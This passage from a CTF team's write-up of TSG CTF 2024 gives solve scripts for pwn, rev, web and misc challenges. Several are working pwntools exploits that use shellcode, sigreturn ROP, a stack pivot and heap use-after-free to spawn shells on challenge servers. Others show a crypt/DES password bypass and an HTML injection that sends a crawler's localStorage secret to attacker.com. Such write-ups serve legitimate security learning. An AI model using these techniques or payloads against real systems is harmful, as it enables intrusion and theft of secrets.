    res = subprocess.check_output(['cargo', 'run', '--release', str(n)]).decode().strip()
    try:
        return json.loads(res)
    except:
        print(f"could not brute {n}", res)
        exit(1)

def generate(n):
    res = brute(n)
    result = []
    for v in res:
        value = str(VALUES[v])
        for key in REVERSE_MAP:
            if abs(float(key) - VALUES[v]) < 1e-9:
                char = REVERSE_MAP[key][2:]
                char = chr(int(char, 16))
                result.append(char)
                break
        else:
            print("Could not find value", value)
            exit(1)
    return ''.join(result)

def solve(index):
    data = generate(index)
    r = remote('34.146.186.1', 53117)
    r.sendline(data.encode())
    return r.recvline().split(b"character is ")[1].decode().strip()

flag = ""
index = 12_345_678

while not flag.endswith("}"):
    flag += solve(index)
    print(flag)
    index += 1
print(flag)
```

This gives us the flag character by character fairly quickly. Thanks Claude!

### prime shellcode
We need self-modifying-code to generate the non-prime byte `0x0f` for a syscall instruction, through which we can read in arbitrary shellcode. We want to work with 64-bit registers, so we need a prime REX prefix, which `0x49: REX.WB` satisfies. Writing a script to generate all 3 prime-byte instructions starting with `0x49`, we find a variety of movs and adds that allow us to position registers over specific offsets in our code (and we can get the code address from leftover values on the stack with `pop rcx`). We have our prime-bytes set on the intended syscall instruction as `0x050d`, and we can use the valid instruction `or dword ptr [rbx], 2` to adjust the `0xd` into `0xf` forming a syscall.
```python
from pwn import *

exe = ELF("./prime_shellcode")
context.binary = exe

serv = "34.146.186.1"
port = 42333

def conn():
    if args.REMOTE:
        r = remote(serv, port)
    else:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript="""
                base
                b *main+500
            """)
    return r

r = conn()

def main():
    nop = b"\x53"
    poprcx = b"Y"
    pl = poprcx*5
    movr11rsp = b"\x49\x89\xe3"
    movraxptrr11 = b"\x49\x8b\x03"
    movr15rax = b"\x49\x89\xc7"
    movrbxr15 = b"\x49\x8b\xdf"
    addrbxr15 = b"\x49\x03\xdf"
    movrdxr11 = b"\x49\x8b\xd3"
    movraxr9 = b"\x49\x8b\xc1"
    movr9rax = b"\x49\x89\xc1"
    movrsir9 = b"\x49\x8b\xf1"
    movraxr13 = b"\x49\x8b\xc5"
    movrdxptrr11 = b"\x49\x8b\x13"
    pl += movr11rsp + movraxptrr11
    pl += movr15rax + movrbxr15
    pl += poprcx*2
    pl += movr11rsp + movrdxr11
    pl += movraxr9 + b"\x02\x02" + movr15rax
    pl += addrbxr15
    pl += asm("or dword ptr [rbx], 2")
    pl += movr11rsp + movrdxptrr11
    pl += nop
    pl += movr11rsp + movraxptrr11
    pl += movr9rax + movrsir9
    pl += movraxr13
    pl = pl.ljust(0xff, nop)
    pl += p8(0xd)+p8(0x5)
    r.send(pl.ljust(0x1000, b"\x02")) 
    sleep(1)
    r.send(b"AA"+asm(shellcraft.sh()))
    r.interactive()

if __name__ == "__main__":
    main()
```


### Scattered in the fog
The flag was converted into a graphical representation of the pixels of each character, and then distributed in a 3D space. However, the voxels of the end characters were in mostly their original locations, meaning they could be used to manually determine the orientation of the original data. This allowed all the original random transforms to be precisely undone. The final flag could be manually read by moving through the 3d point cloud visualizer.

```python=
import cv2
import numpy as np
import open3d as o3d
from scipy.stats import special_ortho_group, norm
import string
from scipy.spatial import transform

import sys


coords = np.load("problem.npy")

#Zoom in on "T"
# xpt1 = coords[13908]
#coords_T = coords[(coords[:,0] > xpt1[0]-25) & 
#                  (coords[:,0] < xpt1[0]+25) & 
#                  (coords[:,1] > xpt1[1]-25) & 
#                  (coords[:,1] < xpt1[1]+25) & 
#                  (coords[:,2] > xpt1[2]-25) & 
#                  (coords[:,2] < xpt1[2]+25)]

# Undo random rotate


xpt1 = np.array([-1458.02485323, 939.24737, 1121.34565031])    # Top left of T
xpt2 = np.array([-1460.33909012, 961.68865727, 1098.65131328]) # Top right of T
xvecrot = xpt2-xpt1
#xvecnorm = xvecrot/np.linalg.norm(xvecrot)

ypt1 = np.array([-1460.55221799, 948.71097016, 1109.81080314])    # Top center(ish) of T
ypt2 = np.array([-1438.91372473, 964.54726882, 1123.26395348]) # Bottom center (ish, aligned) of T
yvecrot = ypt2-ypt1
#yvecnorm = yvecrot/np.linalg.norm(yvecrot)

rotate, rssd = transform.Rotation.align_vectors([(1,0,0), (0,1,0)], [xvecrot, yvecrot])
#print("Rotation matrix")
#print(rotate.as_matrix())

coords_aligned = rotate.apply(coords)

#Undo random translate

center = np.median(coords_aligned, axis=0)
print(center)
coords_centered = coords_aligned - center
coords_shifted = coords_centered + np.array([32,32, 1300]) #Don't go negative - fix the modulo (thid doesn't quite work still)

#print(coords_centered)
#Undo "noise"
coords_combined = np.mod(coords_shifted, [64,64,4000])
#print(coords_combined)


pcd = o3d.t.geometry.PointCloud(coords_combined)

vis = o3d.visualization.VisualizerWithEditing()
vis.create_window()
vis.add_geometry(pcd.to_legacy())
vis.run()  # user picks points
vis.destroy_window()

picked_points = coords_combined[vis.get_picked_points()]
print(picked_points)

#o3d.visualization.draw_geometries([pcd.to_legacy()])

print("TSGCTF{ASK_THAT_DEMON_TO_SIMULATE_THE_REVERSE_OF_SPILL_PROCESS}")
```

### H*

We can abuse how Haskell and F* parse recursive function bindings to get different behavior: 
```
let fib = \n -> if (n < 100) then 0 else 0 in
let fib = \n -> if (2 > n) then n else (fib (n-1) + fib (n-2))
in
let z = fib 6 in
let h = if z < 1 then print 2 else flag 1 in
h
__EOF__
```

## pwn

### Password-Ate-Quiz
The key is generated by rand seeded by the current time, so we can use CDLL to replicate it locally and generate the password.
```python
from pwn import *
from ctypes import CDLL
import time

exe = ELF("./chall")
libc = ELF("./libc.so.6")

context.binary = exe

def srand(seed):
    global cdll
    cdll = CDLL(libc.path)
    cdll.srand(seed)

serv = "34.146.186.1"
port = 41778

def conn():
    if args.REMOTE:
        r = remote(serv, port)
    else:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript="""
                base
                b *$pie+0x0000165e
            """)
    return r

r = conn()

def hint(n):
    r.sendlineafter("> ", str(n))
    return u64(r.recv(8))

def main():
    srand(int(time.time()))
    key = (cdll.rand() << 32) | cdll.rand()
    r.sendlineafter(">", "A")
    pl = p64(key^hint(4))
    pl += p64(key^hint(5))
    pl += p64(key^hint(6))
    pl += p64(key^hint(7))
    r.sendlineafter(">", "A")
    r.sendlineafter(">", pl)
    r.interactive()

if __name__ == "__main__":
    main()
```


### vuln-img
There is a trivial buffer overflow on the stack, and image data is mapped as executable so we can use it for ROP. We use a syscall gadget in the image data to perform sigreturn oriented programming.
```python
from pwn import *

exe = ELF("./chal")
context.binary = exe

serv = "34.146.186.1"
port = 48950

def conn():
    if args.REMOTE:
        r = remote(serv, port)
    else:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript="""
                base
                #b *0x0a00027d
                b *0x000000000a000303 
            """)
    return r

r = conn()

def main():
    poprcx = 0x100771e
    poprsijmprcx = 0x100bb60
    xchgeaxedi = 0x100a3d9
    poprax = 0x100c30e
    leak = 0xb0001d0
    syscall = 0x100ccb7
    sf = SigreturnFrame()
    stack = 0xfff100
    sf.rip = 0x10025dc
    sf.rdi = 0
    sf.rsi = stack
    sf.rax = 0x3fdaa08
    sf.rdx = 0x1000
    sf.rsp = stack
    sf.rbp = stack
    pl = p64(poprax) + p64(15) + p64(syscall)
    pl += bytes(sf)
    r.sendlineafter(">", b"A"*280+pl)
    r.sendlineafter(">", "exit")
    sleep(1)
    sf = SigreturnFrame()
    stack = 0xfff100
    sf.rip = 0x100ccb7
    sf.rdi = 0xfff150
    sf.rax = 0x3b
    sf.rsp = stack
    sf.r10 = u64(b"/bin/sh\x00")
    pl = p64(poprax) + p64(15) + p64(syscall)
    pl += bytes(sf)
    r.send(pl)
    r.interactive()

if __name__ == "__main__":
    main()
```

### piercing_misty_mountain
Using the single return address overwrites from profile, we leak the stack by re-entering into auth before a printf with semi-controlled arguments. On the next profile, we return to the `leave; ret` of auth, and knowing the stack address with `rbp` control, we can pivot to the location of our previously unreachable ROP chain.
```python=
from pwn import *

exe = ELF("./chal")
context.binary = exe

serv = "34.146.186.1"
port = 41777

def conn():
    if args.REMOTE:
        r = remote(serv, port)
    else:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript="""
                b *0x401a63
                base
            """)
    return r

r = conn()

def main():
    rop1 = ROP(exe)
    rop1.rdi = 0x4c8000
    rop1.rsi = 0x1000
    rop1.rdx = 7
    rop1.raw(exe.sym.__mprotect)
    rop1.read(0, 0x4c8000, 0x1000)
    rop1.raw(0x4c8000)
    r.sendlineafter(">", rop1.chain())
    r.sendlineafter(">", "3")
    r.sendafter(">", b"A"*4+p64(0x4c8000)+p64(0x40199c))
    r.sendlineafter("> ", "5030464")
    stack = u64(r.recv(6).ljust(8, b"\x00"))
    r.sendlineafter(">", "3")
    r.sendafter(">", b"A"*4+p64(stack-0x1200)+p64(0x401a63))
    r.sendlineafter(">", "A")
    sleep(1)
    r.send(asm(shellcraft.sh()))
    r.interactive()

if __name__ == "__main__":
    main()
```

### FL_Support_Center
There is iterator invalidation in remove when an element is removed from the friends list. This frees a `0x70` iterator chunk, which we have opportunity to overlap with our string input for message, after which `it->first` will be checked for equality to the support string. We can't directly forge the iterator chunk, but the original friend string is also freed, which we can overlap with our new message and thus enter the second if statement, which will give us a heap leak when it prints out `it->second`. With a heap leak we can forge iterator chunks for arbitrary read/write, which we use to ROP after leaking stack and libc.
```python=
#!/usr/bin/env python3

from pwn import *

exe = ELF("./chal")
libc = ELF("./lib/libc.so.6")

context.aslr = False

serv = "34.146.186.1"
port = 49867

def conn():
    if args.REMOTE:
        r = remote(serv, port)
    else:
        r = process(["stdbuf", "-i0", "-o0", "-e0", exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript="""
                base
                b *$pie+0x000030f6
                b *0x0000155554e2a3e5
            """)
    return r

r = conn()

def add(name):
    r.sendlineafter(">", "1")
    r.sendlineafter(":", name)
    
def msg(name, msg):
    r.sendlineafter(">", "2")
    r.sendlineafter(":", name)
    r.sendlineafter(":", msg)

def lst():
    r.sendlineafter(">", "3")

def free(name, msg=None):
    r.sendlineafter(">", "4")
    r.sendlineafter(":", name)
    if msg:
        r.sendlineafter(":", msg)

fl = b"FL*Support*Center@fl.support.center"

def main():
    n = "A"*len(fl)
    add(n)
    free(n)
    add(n)
    msg(n, b"X"*0x30)
    free(n, fl)
    r.recvuntil("message: ")
    heap = u64(r.recv(8))
    heap <<= 12
    r.sendline("no")
    add("C")
    free("C")
    add("C")
    pl = p64(0)+p64(heap+0x3f0)+p64(0)*2
    pl += p64(heap+0xe1)+p64(35)*2+p64(0)
    pl += p64(heap+0x218)+p64(0x30)*2
    add(b"C"+fl)
    free("C", pl.ljust(0x58, b"\x00"))
    r.recvuntil("message: ")
    stack = u64(r.recv(8))
    r.sendline("no")
    add("D")
    free("D")
    add("D")
    pl = p64(0)+p64(heap+0x3f0)+p64(0)*2
    pl += p64(heap+0xe1)+p64(35)*2+p64(0)
    pl += p64(stack+0xd0)+p64(0x30)*2
    add(b"D"+fl)
    free("D", pl.ljust(0x58, b"\x00"))
    r.recvuntil("message: ")
    libc.address = u64(r.recv(8))-0x29d90
    r.sendline("no")
    add("E")
    free("E")
    add("E")
    tps = heap-0x12000+0xa8
    pl = p64(0)+p64(heap+0x3f0)+p64(0)*2
    pl += p64(heap+0xe1)+p64(35)*2+p64(0)
    pl += p64(stack-0x20)+p64(0x50)*2
    add(b"E"+fl)
    free("E", pl.ljust(0x58, b"\x00"))
    r.sendlineafter("message: ", "yes")
    pl = p64(libc.address+0x2a3e5)
    pl += p64(libc.address+0x1d8678)
    pl += p64(libc.address+0x2be51)
    pl += p64(0)
    pl += p64(libc.address+0x11f2e7)
    pl += p64(0)
    pl += p64(0)
    pl += p64(libc.sym.execve)
    r.sendlineafter(":", pl)
    r.interactive()

if __name__ == "__main__":
    main()
```

## rev

### Misbehave

```python=
from pwn import *
from Crypto.Util.number import long_to_bytes
enc_flag = long_to_bytes(0x20606F90AE778FF3FC09A55EDD6B3951DFFD6E5EA8608885BCD7955275E982F3B7A204954A0E5C67538113BF346170C1)
key = [0xd3283374,0x9bf431fa,0x6dc16dcd,0x245f34b3,0x37599eb1,0xb1d70e98,0x21cab3d2,0xace4d846,0xca3392d0,0x1539787a,0x8822f324,0xc1701c07]
res = b''
for idx, entry in enumerate(key):
    res_ = xor(p32(entry), enc_flag[idx*4:(idx+1)*4])
    res+=res_
print(res)
```

### Warmup SQLite

lost my script, the encryption is basically something along the lines of

```
56|Column|1|0|29||0                     reg29 = Column0
57|Multiply|30|29|24||0                 reg24 = reg29 * 7
58|Add|31|24|20||0                      reg20 = 2 + CHAR * 7
59|Remainder|32|20|21||0                reg21 = 256 % (2 + CHAR * 7)
60|Column|1|1|22||0                     reg22 = Column1
61|Column|1|2|20||0                     reg20 = Column2
62|Add|19|20|23||0                      reg23 = reg20 + 1
63|MakeRecord|21|3|20||0                reg20 = <reg21, reg22, reg23>
64|NewRowid|4|24|0||0
65|Insert|4|20|24||8
66|Goto|0|46|0||0
```

So it's trivial to inverse the operation and restore input from the encrypted output

### TSGDbinary

The stack address used to read user input doesn't seem consistent across different environments... After fixing that, it's just a series of xors and table lookups.

```python3=
from pwn import *

context.arch = 'amd64'

with open('tsgdbinary', 'rb') as f:
    data = f.read()

chunks = []
for i in range(6):
    chunks.append(data[0x3340+0x1000*i:0x4340+0x1000*i])
    if i != 0:
        chunks[-1] = xor(chunks[-1], chunks[-2])

targets = []
for i in range(6):
    targets.append(u64(chunks[-1][-0x60+i*8:-0x58+i*8]) - 0x89fc76aef8d6a8c3)
    if targets[-1] < 0:
        targets[-1] += 1<<64

offsets = [0, 34, 31, 32, 47, 42]
asms = []
xorres = []
for i in range(6):
    asms.append(disasm(chunks[i][offsets[i]:]).split('\n'))
    for idx, line in enumerate(asms[i]):
        if hex(targets[i]) in line:
            xorres.append(int(asms[i][idx-3].split('0x')[-1],16))

bytestream = b''.join(map(p64,xorres))
key = data[0x3080:0x30c0]
bytestream = xor(bytestream, key[0x10:0x40])
bytestream = xor(bytestream, key[:0x30])
print(bytestream)
```

### serverless

Solve script:
```python=
import yaml

y = yaml.safe_load(open('./compose.yml', 'r').read())
proxy = y['configs']['proxy.yaml']['content']
p = yaml.safe_load(proxy)

r = p['static_resources']['listeners'][2]['filter_chains'][0]['filters'][0]['typed_config']['route_config']['virtual_hosts'][0]['routes']

pat = []

for x in r[1:-32]:
    p = x['redirect']['regex_rewrite']['pattern']['regex'].split('/')[1].replace('\\','')
    s = x['redirect']['regex_rewrite']['substitution']

    left = None
    right = None
    emit = None

    if '(' in s:
        parts = s.split('(')
        left = (parts[3][0] + parts[2][0] + parts[1][0]).upper()

    m = s[-4:-1]
    if not '(' in m:
        right = m

    if s[2] != '(' and s[2] == s[2].lower():
        emit = s[2]
    
    pat.append((p, emit, left, right, s))

def dfs(key, pre='', depth=0):
    if depth <= 0:
        return

    s = [x for x in pat if x[2] == key]
    for v in s:
        if v[3] is None:
            print('found', pre + v[0])
            return
        dfs(v[3], pre + v[0], depth - 1)

for c in set('tsgctf'):
    possible = [x for x in pat if x[1] == c]
    print('Search', c)
    for po in possible:
        dfs(po[3], po[0], 9)
```

Prints:
```
Search g
found m4rk0v-a1g0rithm
Search f
found http-red1rect5-can
Search t
found funct10n
Search c
found as-tur1ng-c0mp1ete
Search s
found proce55ing
```

## web

### Toolong Tea
send num as an array for the length check
and put the number as the first element in the array

`[65536, 1, 1]`

### I Have Been Pwned
We control the hash checked with `password_verify`, which internally uses `crypt`.

We don't know the input however, so we need to make a hash that would match the secret input. PHP password hashes use the `crypt` format, which put the hash algorithm inside the hash.

Looking at the list of supported hash algorithms in PHP/crypt, DES stands out since when hashing, it only uses the first 8 characters of the input.

Unfortunately, we don't know the first 8 characters (pepper1) of the secret input. If we did, we could DES hash it and supply that as the password hash.

We need to leak the beginning of pepper1. It's used in both the `password_hash` and `password_verify` calls. We can actually control some of the input to the `password_hash` call!

Doing a bit of fuzzing, an error occurs when we supply a null byte:
`Fatal error: Uncaught ValueError: Bcrypt password must not contain null character in /var/www/html/index.php:21 Stack trace: #0 /var/www/html/index.php(21): password_hash('PmVG7xe9ECBSgLU...', '2y') #1 {main} thrown in /var/www/html/index.php on line 21`

This leaked the required characters! Now with that, we can make the DES hash and pass the verify check to get the flag.

```php
php > echo crypt("PmVG7xe9ECBSgLU", "ez");
ez1ypWjku06LU
```

Our DES hash is `ez1ypWjku06LU`, and from the below snippet we can see that any input that starts with that pepper will pass with the hash:

```php
php > var_dump(password_verify("PmVG7xe9ECBSgLU_OTHER_PARTS_UNKNOWN", "ez1ypWjku06LU"));
bool(true)
```

> TSGCTF{Pepper. The ultimate layer of security for your meals.}

### Cipher Preset Button
The crawler has the following line:
```js
await page.addInitScript(flag => {
    localStorage.setItem('key', flag)
  }, FLAG)
```

`addInitScript` callbacks are triggered on *any* page navigation, so all we need to do is redirect the crawler to an attacker-controlled website. We can then extract the contents of localStorage.

We have user-controlled input via name and prefix. The name is essentially unrestricted, while the prefix is limited to 25 characters. These values are used, unescaped, in two locations: the head (using the name with homerolled sanitization) and the javascript (using the prefix, sanitized by `JSON.stringify`, then `<` is escaped).

The head sanitization only triggers with the presence of `meta` and `link` tags. This prevents us from doing a straightforward redirect (js redirects are also impossible due to the CSP), but note the following line in the crawler:

```js
await page.locator('#generate').click({ timeout: 2000 })
```

We can abuse comments to generate a completely new, syntatically valid HTML page with a link that redirects the crawler:

name = `pepega</title></head><a id='generate' href='https://attacker.com'>a</a><!--`

Since dangling comments do not cause a fatal error in Firefox, this is sufficient, but for the sake of completeness we are able to close the comment (since the sanitization does not affect `>`):

prefix = `-->`

Extracting localStorage is a straightforward affair:

```html
<!DOCTYPE html>
<html>
<body>
<script>
navigator.sendBeacon('', localStorage.getItem('key'));
</script>
</body>
</html>
```

---

*Truncated at 1200 lines. Full text: <https://github.com/dicegang/tsg-ctf-2024/>*
